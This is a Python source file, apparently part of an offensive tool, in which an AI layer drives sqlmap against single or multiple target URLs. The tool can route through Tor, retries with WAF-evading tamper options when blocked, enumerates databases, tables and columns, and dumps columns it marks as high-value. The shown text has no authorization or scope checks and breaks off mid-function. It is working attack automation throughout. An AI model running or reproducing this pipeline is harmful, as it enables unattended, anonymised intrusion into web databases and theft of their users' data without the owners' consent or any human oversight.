import time
import hashlib
import asyncio
import re
import json
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import unquote, urlparse
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum

from core.debug_logger import logger
from core.rag_memory import rag_memory
from core.state_manager import state
# from core.waf_intel import waf_intel
from core.report_generator import report_generator
from core.autonomous_ai import autonomous_ai
from search.web_search import web_search
from config import HIGH_VALUE_COLUMNS
from scanners.sqlmap_backend import SQLMapBackend

import sys 
import os 
sys.path.insert(0, str(Path(__file__).parent.parent))
env = dict(os.environ)
env["PYTHONIOENCODING"] = "utf-8"
env["PYTHONUTF8"] = "1"

class ScanPhase(Enum):
    #SQLMap scan phases 
    DETECTION = "detection"
    FINGERPRINTING = "fingerprinting"
    BYPASS = "bypass"
    ENUMERATION = "enumeration"
    DUMP = "dump"
    COMPLETE = "complete"


@dataclass
class ScanContext:
    #Context for current scan session
    target_url: str = ""
    method: str = "GET"
    post_data: str = ""
    headers: str = ""
    cookies: str = ""
    current_phase: ScanPhase = ScanPhase.DETECTION
    cycle: int = 0
    max_cycles: int = 50
    injection_found: bool = False
    waf_detected: Optional[str] = None
    dbms_detected: Optional[str] = None
    consecutive_failures: int = 0
    max_failures: int = 5
    retry_count: int = 0
    max_retries: int = 10
    successful_techniques: List[str] = field(default_factory=list)
    failed_options: List[Dict] = field(default_factory=list)
    error_patterns: List[str] = field(default_factory=list)
    command_history: List[Dict] = field(default_factory=list)


class SQLMapRunner:
    # SQLMap Runner with full AI workflow understanding by simple way 
    
    def __init__(self, backend_type: str = "sqlmap.py", use_tor: bool = False, 
                 use_rag: bool = True, use_web_search: bool = False):
        self.ai = autonomous_ai
        self.rag = rag_memory
        self.backend = SQLMapBackend(backend_type)
        self.backend_type = backend_type
        self.all_logs: List[str] = []

        
        
        # Results tracking
        self.results = self._init_results()
        
        # Session state
        self.target_url = ""
        self.running = False
        self.tor_enabled = use_tor
        self.rag_enabled = use_rag
        self.web_search_enabled = use_web_search
        self.session_start_time = None
        self.session_id = None
        self.web_searches = 0
        self.injection_point_found = False
        
        # Context for current scan
        self.context: Optional[ScanContext] = None
        
        # Error recovery state
        self.error_recovery_mode = False
        self.recovery_strategies = []
        self.current_strategy_index = 0
        
        logger.info("RUNNER", "Enhanced SQLMap Runner initialized", 
                   {"backend": backend_type, "tor": use_tor, "rag": use_rag, 
                    "web_search": use_web_search, "ai_providers": self.ai.cloud_ai.available_providers})
    
    def _init_results(self) -> Dict:
        #Init results structure 
        return {
            "target": "",
            "injection_found": False,
            "databases": [],
            "tables": {},
            "columns": {},
            "techniques": [],
            "cycles": 0,
            "waf_detected": None,
            "bypass_used": None,
            "method": "GET",
            "post_data": "",
            "headers": "",
            "permission_errors": [],
            "commands_executed": [],
            "ai_recommendations": [],
            "dbms_detected": None,
            "error_analysis": [],
            "retry_attempts": [],
            "dynamic_options_used": [],
            "web_searches": 0,
            "web_search_results": []
        }
    
    async def broadcast(self, msg_type: str, payload: Dict):
        #Broadcast message to all connected clients 
        try:
            await state.broadcast(msg_type, payload)
        except Exception as e:
            logger.debug("RUNNER", f"Broadcast error: {e}")



    async def _safe_web_search(self, query: str, *, tag: str = "WEB", limit: int = 5) -> List[Dict[str, Any]]:
        """Run a best-effort web_search without breaking the scan.

        Notes:
        - This is intended for *reference/triage* (e.g., understanding a WAF product, error codes, vendor docs).
        - It does NOT auto-apply any bypass steps.
        """
        if not self.web_search_enabled:
            return []

        try:
            res = None

            # Support different web_search implementations (function, class, async/sync)
            if hasattr(web_search, "search"):
                res = web_search.search(query, limit=limit)
            elif hasattr(web_search, "query"):
                res = web_search.query(query, limit=limit)
            elif callable(web_search):
                res = web_search(query)

            if asyncio.iscoroutine(res):
                res = await res

            items: List[Dict[str, Any]] = []

            # Normalize common shapes
            if isinstance(res, dict):
                res = res.get("results") or res.get("items") or [res]
            if isinstance(res, (list, tuple)):
                for item in list(res)[:limit]:
                    if isinstance(item, dict):
                        items.append({
                            "title": item.get("title") or item.get("name") or "",
                            "url": item.get("url") or item.get("link") or "",
                            "snippet": item.get("snippet") or item.get("description") or item.get("text") or ""
                        })
                    else:
                        items.append({"title": str(item), "url": "", "snippet": ""})

            # Track + broadcast (terminal always exists)
            if items:
                self.web_searches += 1
                self.results["web_searches"] = self.web_searches
                self.results.setdefault("web_search_results", []).append({
                    "tag": tag,
                    "query": query,
                    "results": items
                })

                await self.broadcast("terminal", {
                    "level": "learning",
                    "line": f"[WEB SEARCH] ({tag}) {query} | Results: {len(items)}"
                })

            return items

        except Exception as e:
            logger.debug("WEBSEARCH", f"Web search failed: {e}")
            return []    
    # ============ RUN MULTIPLE TARGETS ============
    
    async def run_multiple(self, urls: List[str], method: str = "GET", cookies: str = "",
                        max_cycles: int = 30, data: str = "", headers: str = "",
                        concurrent: int = 1,
                        tor: bool = False, rag: bool = True, web_search: bool = False) -> List[Dict]:
        """
        Run SQLMap against multiple targets sequentially or concurrently
        
        Args:
            urls: List of target URLs to scan
            method: HTTP method (GET/POST)
            cookies: Cookie string
            max_cycles: Max cycles per target
            data: POST data
            headers: Custom headers
            concurrent: Number of concurrent scans (1 = sequential)
            tor: Enable Tor routing
            rag: Enable RAG memory
            web_search: Enable web search for bypasses
        
        Returns:
            List of results for each target
        """
        # Set the flags before running
        self.running = True
        state.running = True
        
        all_results = []
        total_targets = len(urls)
        
        self.tor_enabled = tor
        self.rag_enabled = rag
        self.web_search_enabled = web_search
     
        
        # Wire flags/modules into AI layer (so it can optionally use web_search)
        try:
            setattr(self.ai, 'web_search_enabled', self.web_search_enabled)
            setattr(self.ai, 'web_search', web_search)
        except Exception:
            pass
        logger.info("RUNNER", f"Starting multi-target scan", {
            "total_targets": total_targets,
            "concurrent": concurrent,
            "method": method
        })
        
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"\n{'='*60}\n[MULTI-TARGET SCAN] {total_targets} targets | Concurrent: {concurrent}\n{'='*60}"
        })
        
        if concurrent == 1:
            # Sequential execution
            for idx, url in enumerate(urls, 1):
                if not self.running:
                    break
                    
                await self.broadcast("terminal", {
                    "level": "info",
                    "line": f"\n[{idx}/{total_targets}] Starting scan for: {url}"
                })
                
                try:
                    result = await self.run_single(
                        url=url,
                        method=method,
                        cookies=cookies,
                        max_cycles=max_cycles,
                        data=data,
                        headers=headers
                    )
                    all_results.append({
                        "url": url,
                        "status": result.get("status", "UNKNOWN"),
                        "injection_found": result.get("injection_found", False),
                        "databases": len(result.get("databases", [])),
                        "cycles": result.get("cycles", 0)
                    })
                except Exception as e:
                    logger.error("RUNNER", f"Scan failed for {url}: {e}")
                    all_results.append({
                        "url": url,
                        "status": "ERROR",
                        "error": str(e)
                    })
                
                # Brief pause between targets
                if idx < total_targets:
                    await asyncio.sleep(2)
        else:
            # Concurrent execution with semaphore
            semaphore = asyncio.Semaphore(concurrent)
            
            async def scan_with_limit(url: str, idx: int) -> Dict:
                async with semaphore:
                    await self.broadcast("terminal", {
                        "level": "info",
                        "line": f"\n[{idx}/{total_targets}] Starting concurrent scan for: {url}"
                    })
                    try:
                        result = await self.run_single(
                            url=url, method=method, cookies=cookies,
                            max_cycles=max_cycles, data=data, headers=headers
                        )
                        return {
                            "url": url,
                            "status": result.get("status", "UNKNOWN"),
                            "injection_found": result.get("injection_found", False),
                            "databases": len(result.get("databases", [])),
                            "cycles": result.get("cycles", 0)
                        }
                    except Exception as e:
                        return {"url": url, "status": "ERROR", "error": str(e)}
            
            # Create tasks for all URLs
            tasks = [scan_with_limit(url, i+1) for i, url in enumerate(urls)]
            all_results = await asyncio.gather(*tasks)
        
        # Summary
        successful = sum(1 for r in all_results if r.get("injection_found"))
        failed = sum(1 for r in all_results if r.get("status") == "ERROR")
        
        await self.broadcast("terminal", {
            "level": "success",
            "line": f"\n{'='*60}\n[MULTI-TARGET COMPLETE] Success: {successful}/{total_targets} | Failed: {failed}\n{'='*60}"
        })
        
        return all_results
    
    # ============ SINGLE TARGET SCAN ============
    
    async def run_single(self, url: str, method: str = "GET", cookies: str = "",
                        max_cycles: int = 30, data: str = "", headers: str = "",
                        tor: bool = False, rag: bool = True, web_search: bool = False) -> Dict:
        
        # Set flags
        self.tor_enabled = tor
        self.rag_enabled = rag
        self.web_search_enabled = web_search
        
        # Enhanced single target scan with full AI workflow understanding
        
        # ADD THIS DEBUG LOGGING
        logger.info("RUN_SINGLE", f"ENTERING run_single for {url}")
        logger.info("RUN_SINGLE", f"Parameters: method={method}, max_cycles={max_cycles}")
        
        # Initialize context
        self.context = ScanContext(
            target_url=unquote(url),
            method=method,
            post_data=data,
            headers=headers,
            cookies=cookies,
            max_cycles=max_cycles
        )
        
        self.target_url = self.context.target_url
        self.session_start_time = time.time()
        self.session_id = hashlib.md5(f"{url}{time.time()}".encode()).hexdigest()[:16]
        state.current_session = self.session_id
        state.running = True
        self.running = True  # CRITICAL: This must be True
        self.injection_point_found = False
        
        logger.info("RUN_SINGLE", f"self.running = {self.running}, state.running = {state.running}")
        
        # Reset AI and results
        self.ai.reset_bypass_attempts()
        self.results = self._init_results()
        self.results.update({
            "target": self.target_url,
            "method": method,
            "post_data": data,
            "headers": headers,
            "status": "RUNNING",
            "backend": self.backend_type
        })
        self.all_logs = []
        
        logger.info("RUNNER", f"Starting enhanced scan {self.session_id}", {"target": url})
        
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"[SESSION] {self.session_id} | Target: {self.target_url}"
        })
        
        #NEED CATCH SILENT ERROR WITH TRY/EXCEPT
        try:
            logger.info("RUN_SINGLE", "About to start detection phase")
            
            # ========== PHASE 1 => DETECTION & FINGERPRINTING ==========
            await self._run_phase(ScanPhase.DETECTION)
            
            logger.info("RUN_SINGLE", f"Detection complete. injection_found={self.context.injection_found}")
            
            # ========== PHASE 2 => BYPASS (if WAF detected) ==========
            if self.context.waf_detected and not self.context.injection_found:
                logger.info("RUN_SINGLE", "Starting bypass phase")
                await self._run_phase(ScanPhase.BYPASS)
            
            # ========== PHASE 3 => ENUMERATION ==========
            if self.context.injection_found and self.running:
                logger.info("RUN_SINGLE", "Starting enumeration phase")
                await self._run_phase(ScanPhase.ENUMERATION)
            
            # ========== PHASE 4 => DUMP (optional) ==========
            if self.results["columns"] and self.running:
                logger.info("RUN_SINGLE", "Starting dump phase")
                await self._run_phase(ScanPhase.DUMP)
                
        except Exception as e:
            logger.error("RUN_SINGLE", f"EXCEPTION in run_single: {e}")
            import traceback
            logger.error("RUN_SINGLE", f"Traceback: {traceback.format_exc()}")
            self.results["error"] = str(e)
        finally:
            logger.info("RUN_SINGLE", f"ENTERING FINALLY BLOCK - running={self.running}")
            await self._finalize_session()
        
        return self.results
    
    async def _run_phase(self, phase: ScanPhase):
        # Execute a specific scan phase with AI guidance 
        if not self.running:
            return
        
        self.context.current_phase = phase
        
        phase_names = {
            ScanPhase.DETECTION: "AI-POWERED DETECTION & FINGERPRINTING",
            ScanPhase.BYPASS: "WAF BYPASS MODE",
            ScanPhase.ENUMERATION: "SMART ENUMERATION",
            ScanPhase.DUMP: "DATA EXTRACTION"
        }
        
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"\n{'='*50}\n[PHASE: {phase_names.get(phase, phase.value.upper())}]\n{'='*50}"
        })
        
        if phase == ScanPhase.DETECTION:
            await self._execute_detection_phase()
        elif phase == ScanPhase.BYPASS:
            await self._execute_bypass_phase()
        elif phase == ScanPhase.ENUMERATION:
            await self._execute_enumeration_phase()
        elif phase == ScanPhase.DUMP:
            await self._execute_dump_phase()
    
    async def _execute_detection_phase(self):
        # Execute detection phase with intelligent retry 
        logger.info("DETECTION", f"STARTING DETECTION PHASE")
        logger.info("DETECTION", f"self.running={self.running}, cycle={self.context.cycle}, max_cycles={self.context.max_cycles}, injection_found={self.context.injection_found}")
        
        while (self.running and 
               self.context.cycle < self.context.max_cycles and 
               not self.context.injection_found):
            
            self.context.cycle += 1
            logger.info("DETECTION", f"=== CYCLE {self.context.cycle} ===")
            
            # rest of the method
            self.results["cycles"] = self.context.cycle
            
            logger.info("DETECTION", f"Cycle {self.context.cycle}/{self.context.max_cycles}")
            
            # Get AI decision with full context
            ai_decision = await self.ai.smart_analyze(
                logs=self.all_logs,
                results=self.results,
                cycle=self.context.cycle,
                target_url=self.context.target_url,
                method=self.context.method,
                post_data=self.context.post_data,
                headers=self.context.headers,
                phase="detection",
                context=self.context
            )
            logger.debug("DETECTION", f"AI Decision: {ai_decision.get('action')}, mods: {ai_decision.get('command_modifications', [])}")
            
            self.results["ai_recommendations"].append(ai_decision)
            
            # Build and execute command
            success = await self._execute_ai_command(ai_decision, self.context.cycle)

            logger.debug("DETECTION", f"Command executed, success={success}")
            
            if success:
                # Check for injection
                if self._check_injection_found():
                    self.context.injection_found = True
                    self.injection_point_found = True
                    self.results["injection_found"] = True
                    self.context.consecutive_failures = 0
                    
                    await self.broadcast("terminal", {
                        "level": "success",
                        "line": f"[+] SQL INJECTION FOUND at cycle {self.context.cycle}!"
                    })
                    break
            else:
                # Command failed - trigger error recovery
                await self._handle_execution_failure(ai_decision)
            
            await asyncio.sleep(1)
    
    async def _execute_bypass_phase(self):
        # Execute WAF bypass with multiple strategies 
        bypass_strategies = self.ai.generate_bypass_strategies(
            self.context.waf_detected,
            self.context.dbms_detected,
            self.all_logs
        )
        
        for strategy_idx, strategy in enumerate(bypass_strategies):
            if not self.running or self.context.injection_found:
                break
            
            await self.broadcast("terminal", {
                "level": "info",
                "line": f"[*] Bypass strategy {strategy_idx + 1}/{len(bypass_strategies)}: {strategy['name']}"
            })
            
            # Execute bypass attempt
            success = await self._execute_bypass_strategy(strategy)
            
            if success and self._check_injection_found():
                self.context.injection_found = True
                self.injection_point_found = True
                self.results["injection_found"] = True
                self.results["bypass_used"] = strategy['name']
                
                await self.broadcast("terminal", {
                    "level": "success",
                    "line": f"[+] BYPASS SUCCESSFUL with {strategy['name']}!"
                })
                break
            
            await asyncio.sleep(2)
    
    async def _execute_enumeration_phase(self):
        # Execute enumeration phase 
        # Enumerate databases
        await self._enumerate_dbs(self.context.cookies, self.context.headers)
        
        # Enumerate tables
        if self.results["databases"] and self.running:
            await self._enumerate_tables(self.context.cookies, self.context.headers)
        
        # Enumerate columns
        if self.results["tables"] and self.running:
            await self._enumerate_columns(self.context.cookies, self.context.headers)
    
    async def _execute_dump_phase(self):
        """Execute data dump phase for high-value targets"""
        high_value_targets = self._identify_high_value_targets()
        
        if not high_value_targets:
            return
        
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"[*] Found {len(high_value_targets)} high-value targets for dumping"
        })
        
        for target in high_value_targets[:3]:  # Limit to top 3
            if not self.running:
                break
            
            await self._dump_target(target)
    
    # ============ COMMAND EXECUTION ============
    
    async def _execute_ai_command(self, ai_decision: Dict, cycle: int) -> bool:
        #Execute command based on AI decision 
        # Build options from AI decision
        options = self._build_options_from_ai(ai_decision)
        
        # Build command
        cmd = self.backend.build_command(options, phase=ai_decision.get('action', 'detection'))
        
        # Track command
        cmd_record = {
            'cycle': cycle,
            'phase': ai_decision.get('action', 'detection'),
            'command': ' '.join(cmd),
            'ai_recommendation': ai_decision.get('reason', 'Unknown'),
            'waf_bypass': ai_decision.get('waf_detected', {}).get('waf_type') if ai_decision.get('waf_detected') else None,
            'options_used': options
        }
        self.results['commands_executed'].append(cmd_record)
        self.context.command_history.append(cmd_record)
        
        # Broadcast status
        await self.broadcast("status", {
            "status": ai_decision.get('action', 'DETECTION').upper(),
            "target": self.target_url[:40],
            "cycle": cycle,
            "max_cycles": self.context.max_cycles,
            "db_count": len(self.results['databases']),
            "table_count": sum(len(t) for t in self.results['tables'].values()),
            "column_count": sum(len(c) for c in self.results['columns'].values()),
            "dump_count": 0
        })
        
        # Execute
        logs = await self.backend.execute(cmd, cycle)
        self.all_logs.extend(logs)
        
        # Analyze results
        # return self._analyze_execution_results(logs, ai_decision)
  
        return await self._analyze_execution_results(logs, ai_decision)
    
    def _build_options_from_ai(self, ai_decision: Dict) -> Dict:
        # Build SQLMap options from AI decision
        options = {
            'url': self.context.target_url,
            'method': self.context.method,
            'data': self.context.post_data,
            'cookies': self.context.cookies,
            'headers': self.context.headers,
            'tor': self.tor_enabled,
            'answers': 'Y'
        }
        
        # Apply AI command modifications
        cmd_mods = ai_decision.get('command_modifications', [])
        
        # Parse modifications
        i = 0
        while i < len(cmd_mods):
            mod = cmd_mods[i]
            if mod == '--tamper' and i + 1 < len(cmd_mods):
                options['tamper'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--delay' and i + 1 < len(cmd_mods):
                options['delay'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--threads' and i + 1 < len(cmd_mods):
                options['threads'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--technique' and i + 1 < len(cmd_mods):
                options['technique'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--level' and i + 1 < len(cmd_mods):
                options['level'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--risk' and i + 1 < len(cmd_mods):
                options['risk'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--time-sec' and i + 1 < len(cmd_mods):
                options['time-sec'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--timeout' and i + 1 < len(cmd_mods):
                options['timeout'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--retries' and i + 1 < len(cmd_mods):
                options['retries'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--dbms' and i + 1 < len(cmd_mods):
                options['dbms'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--os' and i + 1 < len(cmd_mods):
                options['os'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--prefix' and i + 1 < len(cmd_mods):
                options['prefix'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--suffix' and i + 1 < len(cmd_mods):
                options['suffix'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--string' and i + 1 < len(cmd_mods):
                options['string'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--not-string' and i + 1 < len(cmd_mods):
                options['not-string'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--regexp' and i + 1 < len(cmd_mods):
                options['regexp'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--code' and i + 1 < len(cmd_mods):
                options['code'] = int(cmd_mods[i + 1])
                i += 2
            elif mod == '--text-only':
                options['text-only'] = True
                i += 1
            elif mod == '--titles':
                options['titles'] = True
                i += 1
            elif mod == '--smart':
                options['smart'] = True
                i += 1
            elif mod == '--hex':
                options['hex'] = True
                i += 1
            elif mod == '--no-cast':
                options['no-cast'] = True
                i += 1
            elif mod == '--no-escape':
                options['no-escape'] = True
                i += 1
            elif mod == '--predict-output':
                options['predict-output'] = True
                i += 1
            elif mod == '--keep-alive':
                options['keep-alive'] = True
                i += 1
            elif mod == '--null-connection':
                options['null-connection'] = True
                i += 1
            elif mod == '--chunked':
                options['chunked'] = True
                i += 1
            elif mod == '--hpp':
                options['hpp'] = True
                i += 1
            elif mod == '--force-ssl':
                options['force-ssl'] = True
                i += 1
            elif mod == '--ignore-redirects':
                options['ignore-redirects'] = True
                i += 1
            elif mod == '--ignore-timeouts':
                options['ignore-timeouts'] = True
                i += 1
            elif mod == '--ignore-code' and i + 1 < len(cmd_mods):
                options['ignore-code'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--skip-urlencode':
                options['skip-urlencode'] = True
                i += 1
            elif mod == '--csrf-token' and i + 1 < len(cmd_mods):
                options['csrf-token'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--csrf-url' and i + 1 < len(cmd_mods):
                options['csrf-url'] = cmd_mods[i + 1]
                i += 2
            elif mod == '--second-order' and i + 1 < len(cmd_mods):
                options['second-order'] = cmd_mods[i + 1]
                i += 2
            else:
                i += 1
        
        # Track dynamic options used
        self.results["dynamic_options_used"].append(options)
        
        return options
    
    # def _analyze_execution_results(self, logs: List[str], ai_decision: Dict) -> bool:
 
    async def _analyze_execution_results(self, logs: List[str], ai_decision: Dict) -> bool:
        # Analyze execution results and update state 
        log_text = '\n'.join(logs).lower()
        
        # Check for injection
        injection_indicators = [
            'parameter is vulnerable', 'injection point detected',
            'sqlmap identified', 'back-end dbms', 'is vulnerable',
            'place detected', 'parameter .* is vulnerable'
        ]
        
        for indicator in injection_indicators:
            if re.search(indicator, log_text):
                self.context.injection_found = True
                self._extract_techniques(logs)
                return True
        
        # Check for WAF detection
        waf_detection = self.ai.bypass_engine.analyze_logs_for_waf(logs)
        if waf_detection:
            self.context.waf_detected = waf_detection['waf_type']
            self.results['waf_detected'] = waf_detection['waf_type']
            
            await self.broadcast("terminal", {
                "level": "warning",
                "line": f"[!] WAF Detected: {waf_detection['waf_type']} ({waf_detection['confidence']:.0%} confidence)"
            })
        
        

            # Optional web reference lookup (does NOT apply bypass automatically)
            if self.web_search_enabled:
                waf_type = waf_detection.get('waf_type') or 'WAF'
                query = f"{waf_type} WAF official documentation common block page 403"
                await self._safe_web_search(query, tag=f"WAF:{waf_type}", limit=5)
        # Check for DBMS detection
        dbms = self.ai.bypass_engine.detect_dbms_from_logs(logs)
        if dbms:
            self.context.dbms_detected = dbms
            self.results['dbms_detected'] = dbms
        
        # Check for errors
        error_patterns = self._detect_error_patterns(logs)
        if error_patterns:
            self.context.error_patterns.extend(error_patterns)
            self.context.consecutive_failures += 1
            return False
        
        self.context.consecutive_failures = 0
        return True
    
    def _detect_error_patterns(self, logs: List[str]) -> List[Dict]:
        # Detect and categorize error patterns in logs 
        errors = []
        log_text = '\n'.join(logs).lower()
        
        error_categories = {
            'connection_timeout': {
                'patterns': ['timeout', 'connection timed out', 'read timeout', 'connect timeout'],
                'severity': 'high',
                'recovery': 'increase_delay'
            },
            'rate_limit': {
                'patterns': ['rate limit', 'too many requests', '429', 'throttled', 'blocked'],
                'severity': 'high',
                'recovery': 'increase_delay_use_proxy'
            },
            'waf_block': {
                'patterns': ['forbidden', '403', 'access denied', 'blocked', 'firewall', 'waf'],
                'severity': 'critical',
                'recovery': 'use_tamper_change_headers'
            },
            'permission_error': {
                'patterns': ['permission denied', 'not allowed', 'unauthorized', '401'],
                'severity': 'critical',
                'recovery': 'check_cookies_session'
            },
            'sql_error': {
                'patterns': ['sql syntax', 'mysql error', 'postgresql error', 'oracle error', 'sql server'],
                'severity': 'medium',
                'recovery': 'adjust_payload_dbms_specific'
            },
            'parameter_error': {
                'patterns': ['parameter not found', 'missing parameter', 'invalid parameter'],
                'severity': 'medium',
                'recovery': 'check_parameter_name'
            },
            'encoding_error': {
                'patterns': ['encoding', 'charset', 'unicode', 'utf-8'],
                'severity': 'low',
                'recovery': 'adjust_encoding'
            }
        }
        
        for category, data in error_categories.items():
            for pattern in data['patterns']:
                if pattern in log_text:
                    errors.append({
                        'category': category,
                        'pattern': pattern,
                        'severity': data['severity'],
                        'recovery': data['recovery']
                    })
                    break
        
        return errors
    
    # ============ ERROR RECOVERY ============
    
    async def _handle_execution_failure(self, ai_decision: Dict):
        """Handle command execution failure with intelligent recovery"""
        self.context.retry_count += 1

        if self.context.retry_count > self.context.max_retries:
            await self.broadcast("terminal", {
                "level": "error",
                "line": f"[!] Max retries exceeded ({self.context.max_retries})"
            })
            self.running = False
            return

        # Get error-specific recovery strategy
        error_patterns = self.context.error_patterns[-5:] if self.context.error_patterns else []

        # Try AI recovery strategy first
        recovery = None
        try:
            if hasattr(self.ai, 'generate_recovery_strategy'):
                recovery = await self.ai.generate_recovery_strategy(
                    error_patterns=error_patterns,
                    logs=self.all_logs[-50:],
                    context=self.context,
                    previous_attempts=self.context.retry_count
                )
        except Exception as e:
            logger.warning("AI", f"AI recovery failed: {e}")

        # Fallback to default recovery if AI fails
        if not recovery:
            recovery = self._default_recovery_strategy(error_patterns, self.context.retry_count)

        await self.broadcast("terminal", {
            "level": "warning",
            "line": f"[!] Recovery strategy: {recovery.get('strategy', 'default')} (attempt {self.context.retry_count})"
        })

        # Apply recovery modifications
        if recovery.get('modifications'):
            ai_decision['command_modifications'] = recovery['modifications']

        # Wait before retry with exponential backoff
        wait_time = min(2 ** self.context.retry_count, 30)
        await asyncio.sleep(wait_time)

    def _default_recovery_strategy(self, error_patterns: List[Dict], attempt: int) -> Dict:
        # Default recovery strategy when AI is unavailable 
        strategy = {
            'strategy': 'default',
            'modifications': ['--delay', str(min(2 ** attempt, 30))],
            'reason': f'Default exponential backoff (attempt {attempt})'
        }

        for error in error_patterns:
            category = error.get('category', '')

            if category == 'connection_timeout':
                strategy['strategy'] = 'increase_delay'
                strategy['modifications'] = ['--delay', str(min(5 + attempt * 2, 30))]
                strategy['reason'] = 'Connection timeout - increasing delay'
                break
            elif category == 'rate_limit':
                strategy['strategy'] = 'increase_delay'
                strategy['modifications'] = ['--delay', str(min(10 + attempt * 3, 60))]
                strategy['reason'] = 'Rate limited - aggressive delay'
                break
            elif category == 'waf_block':
                strategy['strategy'] = 'use_tamper'
                strategy['modifications'] = ['--tamper', 'space2comment', '--delay', '3']
                strategy['reason'] = 'WAF block - using tamper'
                break

        return strategy

    # ============ ENUMERATION METHODS ============
    
    async def _enumerate_dbs(self, cookies: str, headers: str):
        # Enumerate databases with retry logic 
        await self.broadcast("terminal", {
            "level": "info",
            "line": "[*] Enumerating databases..."
        })
        
        options = {
            'url': self.context.target_url,
            'method': self.context.method,
            'data': self.context.post_data,
            'cookies': cookies,
            'headers': headers,
            'tor': self.tor_enabled,
            'threads': 10,
            'dbs': True,
            'answers': 'Y'
        }
        
        # Add bypass options if WAF was detected
        if self.context.waf_detected:
            bypass = self.ai.bypass_engine.get_real_world_bypass(
                self.context.waf_detected, 0
            )
            # The bypass dict must be resilient => older configs may not include all keys.
            if bypass.get('tamper'):
                options['tamper'] = bypass['tamper']
            if bypass.get('delay') is not None:
                try:
                    options['delay'] = int(bypass.get('delay', 0))
                except Exception:
                    options['delay'] = bypass.get('delay', 0)
            try:
                options['threads'] = int(bypass.get('threads', options.get('threads', 10)))
            except Exception:
                options['threads'] = bypass.get('threads', options.get('threads', 10))
        
        cmd = self.backend.build_command(options, phase='enumeration')
        logs = await self.backend.execute(cmd, 999)
        self.all_logs.extend(logs)
        
        dbs = self._parse_databases_from_logs(logs)
        self.results['databases'] = dbs
        
        for db in dbs:
            await self.broadcast("finding", {"type": "DATABASE", "value": db})
        
        await self.broadcast("terminal", {
            "level": "success",
            "line": f"[+] Found {len(dbs)} databases: {', '.join(dbs) if dbs else 'None'}"
        })
    
    async def _enumerate_tables(self, cookies: str, headers: str):
        # Enumerate tables 
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"\n{'='*50}\n[ENUMERATING TABLES]\n{'='*50}"
        })
        
        for db in self.results['databases']:
            if not self.running:
                break
            if db.lower() in ['information_schema', 'mysql', 'performance_schema', 'sys']:
                continue
            
            options = {
                'url': self.context.target_url,
                'method': self.context.method,
                'data': self.context.post_data,
                'cookies': cookies,
                'headers': headers,
                'tor': self.tor_enabled,
                'threads': 10,
                'db': db,
                'tables': True,
                'answers': 'Y'
            }
            
            cmd = self.backend.build_command(options, phase='enumeration')
            logs = await self.backend.execute(cmd, 999)
            self.all_logs.extend(logs)
            
            tables = self._parse_tables_from_logs(logs, db)
            if tables:
                self.results['tables'][db] = tables
                await self.broadcast("finding", {
                    "type": "TABLES",
                    "value": f"{db}: {len(tables)} tables"
                })
                await self.broadcast("terminal", {
                    "level": "success",
                    "line": f"  [+] {db}: {len(tables)} tables"
                })
            
            await asyncio.sleep(0.5)
    
    async def _enumerate_columns(self, cookies: str, headers: str):
        # Enumerate columns 
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"\n{'='*50}\n[ENUMERATING COLUMNS]\n{'='*50}"
        })
        
        total_tables = 0
        max_tables = 25
        
        for db, tables in self.results['tables'].items():
            for table in tables:
                if not self.running or total_tables >= max_tables:
                    break
                
                total_tables += 1
                
                options = {
                    'url': self.context.target_url,
                    'method': self.context.method,
                    'data': self.context.post_data,
                    'cookies': cookies,
                    'headers': headers,
                    'tor': self.tor_enabled,
                    'threads': 10,
                    'db': db,
                    'table': table,
                    'columns': True,
                    'answers': 'Y'
                }
                
                cmd = self.backend.build_command(options, phase='enumeration')
                logs = await self.backend.execute(cmd, 999)
                self.all_logs.extend(logs)
                
                columns = self._parse_columns_from_logs(logs)
                if columns:
                    key = f"{db}.{table}"
                    self.results['columns'][key] = columns
                    
                    await self.broadcast("terminal", {
                        "level": "success",
                        "line": f"  [+] {db}.{table}: {len(columns)} columns"
                    })
                    
                    # Check for high-value columns
                    high_value_cols = [c for c in columns if any(hv in c['name'].lower() 
                                                for hv in HIGH_VALUE_COLUMNS)]
                    if high_value_cols:
                        for hv_col in high_value_cols:
                            await self.broadcast("targeting", {
                                "type": "TARGET_KEYWORD_HIT",
                                "detail": f"{db}.{table}.{hv_col['name']}",
                                "keywords": [hv_col['name']],
                                "message": f"High-value column: {hv_col['name']}"
                            })
                
                await asyncio.sleep(0.3)
    
    async def _dump_target(self, target: Dict):
        # Dump data from a specific target 
        db, table, column = target['db'], target['table'], target['column']
        
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"[*] Dumping {db}.{table}.{column}..."
        })
        
        options = {
            'url': self.context.target_url,
            'method': self.context.method,
            'data': self.context.post_data,
            'cookies': self.context.cookies,
            'headers': self.context.headers,
            'tor': self.tor_enabled,
            'threads': 5,
            'db': db,
            'table': table,
            'dump': True,
            'dump_columns': [column],
            'answers': 'Y',
            'start': 1,
            'stop': 10  # Limit dump size
        }
        
        cmd = self.backend.build_command(options, phase='dump')
        logs = await self.backend.execute(cmd, 1000)
        self.all_logs.extend(logs)
    
    # ============ UTILITY METHODS ============
    
    def _check_injection_found(self) -> bool:
        # Check if injection was found in logs 
        log_text = '\n'.join(self.all_logs[-50:]).lower()
        injection_indicators = [
